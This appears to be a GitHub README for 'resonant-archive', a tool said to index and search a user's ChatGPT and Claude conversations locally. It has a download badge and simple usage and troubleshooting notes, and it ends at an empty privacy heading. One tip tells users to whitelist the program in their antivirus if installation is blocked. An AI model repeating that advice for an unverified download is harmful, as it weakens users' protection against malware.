# 🧠 resonant-archive - Search your private AI conversation history

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Timesukkumnerd/resonant-archive)

## 🎯 What is this tool

Resonant-archive keeps a secure copy of your AI conversations on your computer. It allows you to search through your past chats with tools like ChatGPT and Claude. You find information again without sending your data to the cloud. Your history stays on your hard drive. 

This tool organizes your data so you can search using natural language. If you remember a specific topic but not the exact date, this tool finds the right conversation for you.

## 🔍 How to search your history

Once the program runs, you see a search bar. Type your question or keyword into this area. The software looks through your saved conversation files. It shows relevant matches within seconds. You do not need to know technical commands or database queries.

## 📂 Managing your data

The program automatically collects conversation files from your browser or desktop applications. It creates a local index. This index acts as a library of your past interactions. 

- The tool stores data in a hidden folder on your system.
- You can clear your archive at any time through the Settings menu.
- No information leaves your machine. 
- You maintain full control over your conversation logs.

## 🛠️ Troubleshooting common issues

If you encounter problems, refer to these common solutions.

- **Program does not open:** Ensure you have the latest version installed. Restart your computer to clear memory.
- **Search returns no results:** Verify that your conversation files exist in the location the program tracks. You may need to refresh your import settings.
- **Slow performance:** A large history file requires extra processing time during the first launch. Allow the program to run in the background for a few minutes to index your files.
- **Installation errors:** Confirm that your antivirus software is not blocking the installation. Access your settings to add the program to your allowed list.

## 🛡️ Privacy and security
